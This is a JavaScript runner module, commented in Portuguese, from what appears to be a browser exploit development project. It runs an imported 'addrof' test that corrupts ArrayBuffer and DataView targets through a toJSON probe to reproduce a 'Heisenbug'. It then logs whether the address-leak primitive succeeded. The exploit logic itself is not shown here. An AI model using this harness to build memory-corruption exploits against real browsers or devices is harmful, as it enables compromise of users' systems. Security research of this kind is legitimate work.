// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_CorruptTargetInProbe,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_CorruptTargetInProbe";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_CorruptTargetInProbe();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    } else {
        logS3(`  Nenhum detalhe de chamada da sonda foi retornado ou o array estava vazio para o runner.`, "warn", FNAME_RUNNER);
    }

    if (result.errorCapturedMain) { 
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}: ERR ${result.errorCapturedMain.name}`;
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);

        let heisenbugIndication = false; // True if any fuzzing happened on targets
        if (result.all_probe_calls_for_analysis) {
            const fuzzCaptured = result.all_probe_calls_for_analysis.find(d => (d.this_is_leak_target_AB || d.this_is_leak_target_DV) && d.fuzz_capture_status !== null);
            if (fuzzCaptured) {
                 logS3(`  !!!! ALVO DE LEAK (${fuzzCaptured.this_type}) TEVE FUZZING CAPTURADO (Call #${fuzzCaptured.call_number}) !!!!`, "critical", FNAME_RUNNER);
                 heisenbugIndication = true;
            } else {
                 // Verificar se C1 foi criado e tinha payloads (indicação de que a lógica P1 funcionou)
                 const call1Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 1);
                 if (call1Details && (call1Details.payload_AB || call1Details.payload_DV)) { // payload_AB/DV são definidos em C1 na v74
                    logS3(`  INDICAÇÃO DE HEISENBUG: C1_details foi populado com payloads na Call #1.`, "info", FNAME_RUNNER);
                    heisenbugIndication = true; // Consideramos isso uma indicação de que o mecanismo está funcionando
                } else {
                     logS3(`  ALERT: Nenhuma indicação clara de Heisenbug (alvos não atingidos ou C1 não populado).`, "error", FNAME_RUNNER);
                }
            }
        }

        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (result.addrof_A_result) {
            logS3(`    ADDROF ArrayBufferTarget: ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`    ADDROF DataViewTarget: ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}: Addr SUCCESS!`; }
        else if (heisenbugIndication) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}: Target Reached, Addr Fail`; }
        else { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}: No Target?`; }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (CorruptTargetInProbe) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && 
            !document.title.includes("Target Reached") && !document.title.includes("No Target") ) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP} Concluído`;
        }
    }
}
